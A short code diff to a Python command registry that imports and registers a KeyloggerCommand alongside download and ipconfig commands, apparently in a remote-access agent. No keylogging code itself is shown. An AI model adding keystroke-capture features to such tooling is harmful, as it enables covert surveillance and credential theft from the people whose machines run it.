@@ -1,6 +1,7 @@
 from .help import HelpCommand
 from .download import DownloadCommand
 from .ipconfig import IPConfigCommand
+from .keylogger import KeyloggerCommand
 
 
 class CommandRegistry:
@@ -10,6 +11,7 @@ class CommandRegistry:
         self.register(HelpCommand())
         self.register(DownloadCommand())
         self.register(IPConfigCommand())
+        self.register(KeyloggerCommand())
 
     def register(self, command):
         self.commands[command.name] = command
